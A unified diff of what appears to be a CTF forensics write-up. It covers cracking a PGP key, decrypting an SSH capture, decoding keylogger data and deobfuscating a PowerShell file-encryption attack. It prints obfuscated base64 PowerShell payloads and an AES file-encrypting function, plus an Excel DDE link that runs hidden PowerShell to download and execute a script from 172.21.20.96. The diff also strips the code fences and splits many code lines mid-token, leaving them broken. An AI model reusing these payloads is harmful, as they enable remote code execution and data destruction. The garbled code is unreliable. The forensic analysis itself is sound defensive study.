@@ -88,47 +88,18 @@ AfHcpCgs8i27iS/3lHxSzgZbZB5NiaOJCKuq7Zerg9ULtyONhchx8Es8SLU3nY0/
 IDcufsWUUAptvV8PmQ==
 =LIOj
 -----END PGP PRIVATE KEY BLOCK-----
-```
-
-
-
-```
 gpg2john 1.txt > hash.txt
 hashcat -m 17010 hash.txt -a 0 ./webtools/rockyou.txt  --force
-```
-
-
-
-```
 Netascii is a modified form of ASCII, defined in RFC 764. It consists of an 8-bit extension of the 7-bit ASCII character space from 0x20 to 0x7F (the printable characters and the space) and eight of the control characters. The allowed control characters include the null (0x00), the line feed (LF, 0x0A), and the carriage return (CR, 0x0D). Netascii also requires that the end of line marker on a host be translated to the character pair CR LF for transmission, and that any CR must be followed by either a LF or the null.
-```
-
-
-
-```
 data = open('Confidential.7z', 'rb').read()
 data = data.replace(b'x0dx0a', b'x0a').replace(b'x0dx00', b'x0d')
 open('out.7z', 'wb').write(data)
-```
-
-
-
-```
 {"task_name": "sshd", "sshenc_addr": 94122048527088, "cipher_name": "aes256-gcm@openssh.com", "key": "895688678410a0b9b358b0b04ab909d49333791e864c89593c66d5ce5083b8e5", "iv": "40e87818bef3d68c45c9a9f5"}
 {"task_name": "sshd", "sshenc_addr": 94122048527408, "cipher_name": "aes256-gcm@openssh.com", "key": "f03b9e6c1b37ec53d89839e85deffb204d9a261076014850399499e913a1b32b", "iv": "dc972db4e5f7e8738ddf57d6"}
-```
-
-
-
-```
 network-parser -p Stealth.pcapng --popt keyfile=key.json --proto ssh -o dump/
-```
-
-
-
-```
 Warning: stream not in closed state!
-[192.168.25.1:56174 -> 192.168.25.128:22        2023-01-12 06:07:53.487476 - 2023-01-12 06:11:20.223402]
+[192.168.25.1:
+56174 -> 192.168.25.128:22        2023-01-12 06:07:53.487476 - 2023-01-12 06:11:20.223402]
 [User Auth Request]
 username:      'debian'
 service_name:  'ssh-connection'
@@ -1356,11 +1327,6 @@ Server stream offset: 0xf3d4
 Client stream offset: 0x4243
 Remaining server data: 0x0
 Remaining client data: 0x0
-```
-
-
-
-```
 #!/usr/bin/python
 
 # script built on https://stackoverflow.com/a/16682549
@@ -1378,7 +1344,7 @@ Stands for: long int, long int, unsigned short, unsigned short, unsign
 FORMAT = 'llHHI'
 EVENT_SIZE = struct.calcsize(FORMAT)
 
-#open file in binary mode
+    #open file in binary mode
 in_file = open(infile_path, "rb")
 
 event = in_file.read(EVENT_SIZE)
@@ -1652,7 +1618,8 @@ while event:
     (tv_sec, tv_usec, type, code, value) = struct.unpack(FORMAT, event)
 
     if type != 0 or code != 0 or value != 0:
-        # print(f'{tv_sec}.{tv_usec}, {type}, {code}, {value}, {value:08b}')
+        # print(f'{tv_sec}.{tv_usec}, {type}, {code}, {value}, {value:
+08b}')
 
         if type == 0x01: # EV_KEY
             key = keymap[code]
@@ -1678,11 +1645,6 @@ while event:
     event = in_file.read(EVENT_SIZE)
 
 in_file.close()
-```
-
-
-
-```
 archiveSPACE
 managerENTER
 SHIFT
@@ -1738,22 +1700,12 @@ onfidentialDOT
 pdfTAB
 ENTER
 exitENTER
-```
-
-
-
-```
 archive manager
 Confidentials3cr3t7zp@ssw0rd!terminal
 cd Docu[TAB]
 ls
 rm -rf Confidential.pdf[TAB]
 exit
-```
-
-
-
-```
 cd ~
 cd Desktop
 ls
@@ -1781,22 +1733,15 @@ pwsh
 ls
 mv T3C4U.SOS recycle.bin
 reboot
-```
-
-
-
-```
 ls
 whoami
-( nEw-oBJECT syStem.io.sTrEamReadeR( ( nEw-oBJECT sysTeM.iO.COMPReSsioN.deflAtEsTREaM([sySTEM.iO.MeMoRyStreaM] [ConVert]::froMbaSe64striNg('hVXbbuJIEH2PlH/omZfYGrAwtxCkPASWXLTDgGL2Mot46MENeGLaqN3WLov873uqbQPGiRZhulz3OlXVBKM/mWVZnw/tRnpw79JDs5Me2l3QOF0XNJ4mydqge+mh1cJ5i5Me6DQhAkVakLjQwLcNAXy1yB9em2QLaYto2HVIk94Rpw0dF2eLYkDWBN2ENxeOwepQCumBEqI3eqALWQvcDs42niY9FA+vYN+mn+srdsPyT3p9dX1VvHyfjoVcqv1OR4rd0ysX8ZjLm9oNXwsfrG/i7/rkx0+x1Mzbx1psHU8sExXovTM0dmvFd1BnJeNDKUS84WCTQ+eXIN5FsbBsKEBPGaKSjPAHey3iLKNjgs5McRmvIrV9DCQPYZ7rlVxkOVSCXXxOnGDFLJhNud7Y7CxvSm8QRss3ku5CHkgTq8YaNVbiOF+FXMP4ohCYn0ID9JTK5bsNcAt2G6HGkS8W/f5wMLw2lThT7vuBXKPo+cdIwzzXy+3/gnEVsxMIEG+zHCyQ/f6r4P5DGBpdquwxCIXzmIThN74VF0BBHCWakMm8lnTZF/ZTThxv4uG4vqJyR5M3+/+xptlScKCF8oQ2ru7JlSmSQoC2FyejuacV6l3kTcoEdjHFA7EOJHtv3gze+BnjKecExvsAQ2AVoeeTRO8S4sCXzzF/+wwFrRJRY1Oa+VOrXiYOpb6gVpYRUEInSlKBpMCOE850VAAMI/+jGaY2mzgEcME0c+kF/wowtVk+9gfqEPWRUljk+ljEMRSPQWWk2SpKpP/J9OqyQT+U4G9ldlqZhNPAU8AsaJEttVRvSr7T4+AXnRpJn8zMOGWJPix1EEnmIUWpw/0wkjqQyQV+NDOfKoOKjsMXtuGhgCrL6LIf/b4B5oHQIz7Os+HPp7tWvXqOYwyDZqebA3/GfO/GyOAwiN+zJygVK+s9UwLNnlkToSJzY4FcJTKDYJQFJzJ3OB9u/VDoQSBp2aF7thDTYn/APi3mVx5rU+ws2GbD6R679N7FeL4WZ2KwZ/udsOZxtnbFPkxpl8oL88G/BNWo6y+Am9VNt7/ThDsvv+PKOAGdG8OT4FrkAETHjK2nwsepT3apRsE+Ku9XsaflQF5o3dkcmjJUtMR2XNwYZeNsz8/+tYbRdpdo8czjjVVM2Ez8ox2kHVF/MGe/zR57DpLOhgtX4eVM3di2o8Q05EthWfPlM39ddO++ZMRtQbiNW7s292avL/JpkbFadxU7t9Et9N3G0UXFsF0x7BVxekezaryuzez/AA==' ), [SyStem.IO.comPreSSION.cOmpreSSIONModE]::DEcOmPREsS ) ), [text.ENcodiNg]::AScII)).ReAdToend()|&( $sHeLLid[1]+$shELliD[13]+'x')
+( nEw-oBJECT syStem.io.sTrEamReadeR( ( nEw-oBJECT sysTeM.iO.COMPReSsioN.deflAtEsTREaM([sySTEM.iO.MeMoRyStreaM] [ConVert]::
+froMbaSe64striNg('hVXbbuJIEH2PlH/omZfYGrAwtxCkPASWXLTDgGL2Mot46MENeGLaqN3WLov873uqbQPGiRZhulz3OlXVBKM/mWVZnw/tRnpw79JDs5Me2l3QOF0XNJ4mydqge+mh1cJ5i5Me6DQhAkVakLjQwLcNAXy1yB9em2QLaYto2HVIk94Rpw0dF2eLYkDWBN2ENxeOwepQCumBEqI3eqALWQvcDs42niY9FA+vYN+mn+srdsPyT3p9dX1VvHyfjoVcqv1OR4rd0ysX8ZjLm9oNXwsfrG/i7/rkx0+x1Mzbx1psHU8sExXovTM0dmvFd1BnJeNDKUS84WCTQ+eXIN5FsbBsKEBPGaKSjPAHey3iLKNjgs5McRmvIrV9DCQPYZ7rlVxkOVSCXXxOnGDFLJhNud7Y7CxvSm8QRss3ku5CHkgTq8YaNVbiOF+FXMP4ohCYn0ID9JTK5bsNcAt2G6HGkS8W/f5wMLw2lThT7vuBXKPo+cdIwzzXy+3/gnEVsxMIEG+zHCyQ/f6r4P5DGBpdquwxCIXzmIThN74VF0BBHCWakMm8lnTZF/ZTThxv4uG4vqJyR5M3+/+xptlScKCF8oQ2ru7JlSmSQoC2FyejuacV6l3kTcoEdjHFA7EOJHtv3gze+BnjKecExvsAQ2AVoeeTRO8S4sCXzzF/+wwFrRJRY1Oa+VOrXiYOpb6gVpYRUEInSlKBpMCOE850VAAMI/+jGaY2mzgEcME0c+kF/wowtVk+9gfqEPWRUljk+ljEMRSPQWWk2SpKpP/J9OqyQT+U4G9ldlqZhNPAU8AsaJEttVRvSr7T4+AXnRpJn8zMOGWJPix1EEnmIUWpw/0wkjqQyQV+NDOfKoOKjsMXtuGhgCrL6LIf/b4B5oHQIz7Os+HPp7tWvXqOYwyDZqebA3/GfO/GyOAwiN+zJygVK+s9UwLNnlkToSJzY4FcJTKDYJQFJzJ3OB9u/VDoQSBp2aF7thDTYn/APi3mVx5rU+ws2GbD6R679N7FeL4WZ2KwZ/udsOZxtnbFPkxpl8oL88G/BNWo6y+Am9VNt7/ThDsvv+PKOAGdG8OT4FrkAETHjK2nwsepT3apRsE+Ku9XsaflQF5o3dkcmjJUtMR2XNwYZeNsz8/+tYbRdpdo8czjjVVM2Ez8ox2kHVF/MGe/zR57DpLOhgtX4eVM3di2o8Q05EthWfPlM39ddO++ZMRtQbiNW7s292avL/JpkbFadxU7t9Et9N3G0UXFsF0x7BVxekezaryuzez/AA==' ), [SyStem.IO.comPreSSION.cOmpreSSIONModE]::
+DEcOmPREsS ) ), [text.ENcodiNg]::
+AScII)).ReAdToend()|&( $sHeLLid[1]+$shELliD[13]+'x')
 Encryption -Path ./T3C4U
 Remove-Item -Path ./T3C4U -Force -Recurse
 exit
-```
-
-
-
-```
 iEX ((("{40}{19}{25}{46}{15}{11}{41}{20}{14}{48}{33}{47}{37}{35}{2}{1}{31}{23}{18}{8}{45}{9}{39}{28}{24}{43}{38}{27}{53}{13}{36}{49}{16}{30}{17}{26}{21}{12}{0}{51}{4}{6}{10}{50}{5}{32}{34}{52}{42}{22}{29}{3}{44}{7}"-f '        }
 
         YPMencryptor = YPMaesMan','aged = New-Object System.Security.Cryptograp','  YPMaesMan','{
@@ -1810,7 +1755,8 @@ iEX ((("{40}{19}{25}{46}{15}{11}{41}{20}{14}{48}{33}{47}{37}{35}{2}{1}{31}{23}{
         YPMen','se()
     }
 ','ed.Padding = [System.Security.Cryptography.PaddingMode]::Z','cryptedBytes = YPMaesManaged','m
-    (','::ReadAllBytes(YPMFile.FullName)
+    (','::
+ReadAllBytes(YPMFile.FullName)
             YPMoutPath = YPMFile.FullName + jnO.SOSjnO
 ','sEOk))
 
@@ -1831,7 +1777,8 @@ iEX ((("{40}{19}{25}{46}{15}{11}{41}{20}{14}{48}{33}{47}{37}{35}{2}{1}{31}{23}{
     }
 
     End ','Path -ErrorAction SilentlyContinue
-','hy.AesManage','   [System.IO.File]::WriteA','stem.','llBytes(YPMoutPath, YPMencryptedBytes)
+','hy.AesManage','   [System.IO.File]::
+WriteA','stem.','llBytes(YPMoutPath, YPMencryptedBytes)
       ','256Managed
       ','PMPath) {
             YPMFile = G','ography.SHA','28
@@ -1844,12 +1791,8 @@ iEX ((("{40}{19}{25}{46}{15}{11}{41}{20}{14}{48}{33}{47}{37}{35}{2}{1}{31}{23}{
     }
 
     Process {
-        YPMaesManaged.Key = YPMshaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes(EOkYPMencryptedByte')).rePlace(([cHaR]69+[cHaR]79+[cHaR]107),[STRInG][cHaR]39).rePlace(([cHaR]106+[cHaR]110+[cHaR]79),[STRInG][cHaR]34).rePlace(([cHaR]89+[cHaR]80+[cHaR]77),[STRInG][cHaR]36) )
-```
-
-
-
-```
+        YPMaesManaged.Key = YPMshaManaged.ComputeHash([System.Text.Encoding]::
+UTF8.GetBytes(EOkYPMencryptedByte')).rePlace(([cHaR]69+[cHaR]79+[cHaR]107),[STRInG][cHaR]39).rePlace(([cHaR]106+[cHaR]110+[cHaR]79),[STRInG][cHaR]34).rePlace(([cHaR]89+[cHaR]80+[cHaR]77),[STRInG][cHaR]36) )
 function Encryption{
     [CmdletBinding()]    
     [OutputType([string])]    
@@ -1860,20 +1803,24 @@ function Encryption{
     Begin {        
         $shaManaged = New-Object System.Security.Cryptography.SHA256Managed        
         $aesManaged = New-Object System.Security.Cryptography.AesManaged        
-        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC        
-        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros        
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::
+CBC        
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::
+Zeros        
         $aesManaged.BlockSize = 128        
         $aesManaged.KeySize =   256    
     }    
     Process {        
-        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes('$encryptedBytes'))                       
+        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::
+UTF8.GetBytes('$encryptedBytes'))                       
          if ($Path) {            
             $File = Get-Item -Path $Path -ErrorAction SilentlyContinue              
             if (!$File.FullName) {                
                 Write-Error -Message "File not found!"                
                 break            
             }            
-            $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)            
+            $plainBytes = [System.IO.File]::
+ReadAllBytes($File.FullName)            
             $outPath = $File.FullName + ".SOS"          
         }        
         $encryptor = $aesManaged.CreateEncryptor()        
@@ -1881,7 +1828,8 @@ function Encryption{
         $encryptedBytes = $aesManaged.IV + $encryptedBytes        
         $aesManaged.Dispose()                        
         if ($Path) {            
-            [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)            
+            [System.IO.File]::
+WriteAllBytes($outPath, $encryptedBytes)            
             (Get-Item $outPath).LastWriteTime = $File.LastWriteTime            
             return "File encrypted to $outPath"        
         }    
@@ -1891,11 +1839,6 @@ function Encryption{
         $aesManaged.Dispose()    
     }
 }
-```
-
-
-
-```
 ~/Desktop/2layer/home/kalilinux$ cp -r .gnupg /home/{username}/
 ~/Desktop/2layer/home/kalilinux$ gpg --list-key
 /home/{username}/.gnupg/pubring.kbx
@@ -1919,38 +1862,18 @@ gpg: encrypted with 3072-bit RSA key, ID 2C94CC6FE75882DC, created 2023
       "VNvodich"
 gpg: [don't know]: invalid packet (ctb=00)
 gpg: [don't know]: invalid packet (ctb=00)
-```
-
-
-
-```
 Note 1: All flags are wrapped in idek{} format, you don't need to do it yourself.
 Note 2: The zip file is the same for all Mixtape. HiddenGem.pcapng is mainly for `HiddenGem Mixtape 3: The Ultimate Goal` however it may contain data for the rest of HiddenGem Mixtape. 
 Note 3: Password for HiddenGem.pcapng will be released with Mixtape2 and 3
-```
-
-
-
-```
 2023-01-07T194857_HiddenGem.vhdx: Microsoft Disk Image eXtended, by .NET DiscUtils, sequence 0xe, NO Log Signature; region, 2 entries, id Metadata, at 0x200000, Required 1, id BAT, at 0x300000, Required 1
-```
-
-
-
-```
 <?xml version="1.0" encoding="UTF-8" standalone="yes"?>
-<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="x14" xmlns:x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main"><ddeLink xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" ddeService="cmd" ddeTopic="/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(&quot;http://172.21.20.96/windowsupdate.ps1&quot;);IEX $e"><ddeItems><ddeItem name="_xlbgnm.A1" advise="1"/><ddeItem name="StdDocumentName" ole="1" advise="1"/></ddeItems></ddeLink></externalLink>
-```
-
-
-
-```
-& ( $sHEllid[1]+$sheLLiD[13]+'X')( NEW-obJEct Io.cOMPReSSiON.DEFlAteStrEAM( [SyStem.iO.mEMOrySTream] [SysteM.cOnVerT]::FRomBase64STRINg( 'XVldb9vIFf0rflggCVYJREqy44c+jCKWUbtDZRJr2+FiH7asy8iynEWSLSVhf3x5zzkzMgoYkEWRM3fuxznnXr5s7ofXm+Xfqnd3V949ufre3z99f+O23zeH3+52m+bNh2/vvt6vqqfva/fT1YurF5Orly9urue35b+Lori+mc/+M52Xs3kx+1dxPV1Mf1vM5gvfL9+691sXend01TfXhmVw1Vu3DW7u3gf3s1su3Kpy3bD8p/trdD8Ny5/dqnNb506u7tyH4G7d+8H54M523Q9ucPXabYIr3cq7Jtj36DZu+ehWW7t+dHXlfD+uv3L2/ezq4LxbPrhVdG1vz4Xxfrtv/O7G++rt+LtdX7vGLQ/2+/j82daPg90XXIP1KvsczI7xs7Dnm35cd3y+DeP3cb/Rvrk9N35fuNpr/62L/fKz2Y3nbJ1gz8Vx/eXO9uV5uvE+s6cyu2ZY39lz0a6Pv/d23pNb7c3+ws4b8dze9oW9zbDca73Crre27/jZONk72PW1rV+afR6/R9oz2h8H7j+uO4V/wmgf7Lf7g607h/+1Xgs7vPlhr3X2PL+dy2ndvfn/oHhh3Q1+9xZX2L/BuTrFxz75fAyM02j/2faNWC/YOeAP2Luy+Mt/uO5Gu8wOrDtgHcQzWlxL81srOxr4obLfB8TL8f7Gzml+C2NeMU7JjwPzwNbv6Xf4y/LP/Kn80/mRr2Yv4hHsPGfzP/0czE972GP5O57Pp3MhD2Dfib+P667g96niiPMyr73ywdvzyI828FxjPhzoD57bD/QL/dGpTirlw9rWHZBXw7iP5T/qa2txmaJ+cC48v0AdWJ7bd/PnqlI+4ZyIy+iHzzgv9ulsfZyfdq8t/jPFcSq/TFWnqPPR/wfl40zfH5lv9ntFe5nHj1gH9lge2/e9XX9AnHrbx/ZlfTZWd1bXyuMN1rXv9I9X/vG8iscqyK+GB3a/e+YHq9OgevS0H/GxfTvehzyyOHaqi63OAbyAv4BHFj+r+3Ff1LHhF/CkEg7iuSPiCZwEPpVcx/wVdH77PdfRgvlD/6E+xriirgwPkj/hJ8t7+4z6bnhCnGPeB7OTeYF66O1zAf/BL1F5uM54RVxFnBfEA8vjYHW+t7whzgq/iQMnOw/wpI4XfLP1DR97O6cX/qbzGM4z/i38JDvp1xPzn36Cv6zOdb0RLjD/EGfY73vWD85RV7If9XTWumfEVfWG+iT+Akd84ifUgWP91ZH4UPtL/J34xSnOA+PKvOyE68CZHewN3Id5EnKdM/8i8wLr8brvab8Pic9YFxvdH3vmGfjUzg1eAs4eySNml/EjcSsOwklH/qL/KuGd4TR5huvbPow/zws/n5BP6RN1WPE85O+F4oC88MCfjvmfcdETT81/ygv6xerQ9qvITzV4aScchj1tIK+mugM/AyfIg23I+HSSHjgpX6ArWHdr4kQN/z8oD4Qztr7POqEV/rXi+cbyiPlKnO6JVy3uh9+mzAPxaC9d4RKfWB4ZXhIfgWesqwLnsLjUKa6VeGlr55kqDmfh5SA8Al4Qp/B5zP6yeOP+ijxA3toJRx5Z59yv0fPkhZj1DP0qHDSdBv0F3MP+rKdg+TNl/tl9iC/rVjwZ+4zTB8VrJ16fCaexLngH+JHwUXWU8sFxfeKF6ov8O8X5Ef/EL1vmi51f+NuqzqN0k1cdEV8R16PiPCdOst6Ak+M+0B/QkcKXgTyzQX6JLxHflK86n+JB3QG8f5S/iePIC/Ob9MrAetpIt5DHUadH6b3yOZ6ijoAz9AviNH4nnhn+ZX05SP9iH/BNneouMi+pywr5mfmU9Bdwy1N30a+D9NRROgr5Q/6L0l3mH9YZ4p/ymjgxQ55kfc/4xwtPJ314ki6fMt7UXY0jzhF314q3pw4EL5FfwIusD+pV9Qut8IU4Jx6C36mvac+a8co4DV01Uz+wV/+xk51H6h3xq+LswcMV8xh5z7pj3+GEF+LzpJ9XKf6o4xn7KOZz4/K5oE+JP6kuAv1keNhTf437pM/jBSeDcC+qTvHcTOffEf8YD/Kqy3qMfL9WnxKyzo46TwM8EE+wDs7Cg0fys/wg3b4RLkN/5v6log6rI3EIfRjrpO3p5ygdnPpG6h9vfoa/NiHjGnU08v+iHxPOsJ9DXM/C4QPiOiS8I+/AL+Bx8kcre6CLocOJK9QDUf0M/DaobhfKk5n4f6/4Dvn+rJu2ub6og+SfVdIXve3/QB3NvoD82ikuXvy1lb6Hf47qA9K5HxT3QvEaxCdT8X/SefIL63WjOqGuieybiT/CAfaV1JdR/B/Ur8Rn+E69wbxN/Wql/NyLD5Ie3YpfgnTSVnneEweNH6UbPfhVfQPixHyMWZ/xPvAe+nLxYKpP7ddoPhAVD8YpSNeIT7IusnxmvDfi8yj9w3XXynfkyaN4tqQ/qe9Z59A1B9V3edHBUfXViTc64apXXYlfiXufOWeQPnHMU65nvEec9xeemEmX7KTvSs0b5uoTkx541Pnn3E/2OM0feuEz/NrTDuqX86WPTTjl5V8vf1eZ/zgX6Jnn7Bc15yGfcj5TSffvNafxirvlmfIS/kxzhdS3uv+ro6i+bC889Ipv0tndpQ7Qp0X1w53i67IuS7q11ZyB/ddadRiF52m95P+ofqVj/tZb6YnIOBMPFppPPbt/TX2ScJL5VaifXQiv9tKfJXGUfQT9lnDpwpepnpFP1Lnsg4U3nP9UF95JujUQz7z0dBOybk28/EB9JLt76lbGM+T+vxEeNT11NHWuV51VnNcR/89ZJ/B6SVwgnxM3KuGSeDnPBVTfteaQ5KUd+3Xq1Ua8m/ZrNA/cONXnQD2R7E32JL7jvC6oDsG7xUXnOOFeFN520gOpj43kLfoh6fqpzvUgHJuzDplfUXwMnjf7pDuIe2v13159wFo82Yl3K+nVNP/rVA991jWsZyf798/6Nulj9QvgE/ZXe+Ep7NyAT/fq+9eaR25VH152dxmfczwH1UlQHzsQB3Nck59Un436HM4HQ9ZtKd88+pWke2PWL4gX53/7y1xOfRl55CT8KISXZY4L86LIfdOqUj/nchy85ivQ4fRbwtmz8ruQnQ+awyyoF6nrqUe2ec6Y5lBR/X2UbmOe7fOcK/VZreZQjfAKc5yV8AH8of5fPL/R3NZrjgZ9ST5J9Us+0X3ocxnPnew7ZF6v0/mkvxlvzctz/zSo39/neqJOmRPHiG9RfR37+qj7tuQDztlTfZ40x35kP8hP+jdov22eF2FeT/0zV97txH+pnoQL1CP0c5/nBHHIfFRc+spefbbnXIU8duRcgvodcwzixkJ8cpYd0r3ST+qDN7mPIc8TN9T/PpvHoz9i/3FQPh+VPwV5RnN81SV0PefoC8aV+N8mXRCk27Kezf37iTzAekLfmvto4PMD38dQz7E/69R/+jwX5/uhqD4s6aE+zyk573SyK83ZvOYPfdZRXroJPAQcpp7wmlNmfhiYt3wfspXersQnXnyQdNhaeS68Z/4e9Z5p0Fww4cxBfftJeDRXfzzT/Hsh/VTqfVGR++466RDHfOe84JT5mPPws+KkvlfvgRJ+Sr+k9yJ5TjVwbtmqr2kvPEI94ajTmnwO8gHrLuFGld9feeUp8Te9H/Lqj6Qras3f0vuAzIfhOa9f+nf0QawzxsOpv5e/s+6K7B/T+x3gFHUy+SVoXrlWvqY+PkiHVuoL0vNbzX8j51a1v+SF5je5P1D828t7ryLrilrnAt/xPI3el1BveuHIWnM0zOV37FfzfD+9X0t1+sA5i95X5vkleSZq/uT1HiDhYdOrHxmIm43qfHOZm6V59Fk485cXV3+++/L03+rj3ffN60/33R9f7z/dfdw19dXr/dViMSmK2aRYvJ2Ui/lkUUxu55PiZrw6s//m5aQsr8efbyfXs8nNpJiPv96Ov44fs9vJ+FcWN5Px4fG/4u3byfV0/CjHW8rJzdwWKKfjDzfjlel0cjt79epNff/96f5u+PLx7+++Vqvq6W7tHl++evO7+/TtH18+rq7+fHP18uqHD9/ef/HVL2Xx648//P7t/eZw/8ts/uuPL44vXv0P' ) , [sySteM.IO.ComprESsiON.cOmpresSiONMODe]::dEcomPrEss)|fOReach-OBJECt{NEW-obJEct iO.sTReAMrEAder( $_ , [TExT.EncOdiNg]::AscIi)} | fOREacH-obJeCt{$_.reADToend()})
-```
-
-
-
-```
+<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:
+Ignorable="x14" xmlns:
+x14="http://schemas.microsoft.com/office/spreadsheetml/2009/9/main"><ddeLink xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" ddeService="cmd" ddeTopic="/c powershell.exe -w hidden $e=(New-Object System.Net.WebClient).DownloadString(&quot;http://172.21.20.96/windowsupdate.ps1&quot;);IEX $e"><ddeItems><ddeItem name="_xlbgnm.A1" advise="1"/><ddeItem name="StdDocumentName" ole="1" advise="1"/></ddeItems></ddeLink></externalLink>
+& ( $sHEllid[1]+$sheLLiD[13]+'X')( NEW-obJEct Io.cOMPReSSiON.DEFlAteStrEAM( [SyStem.iO.mEMOrySTream] [SysteM.cOnVerT]::
+FRomBase64STRINg( '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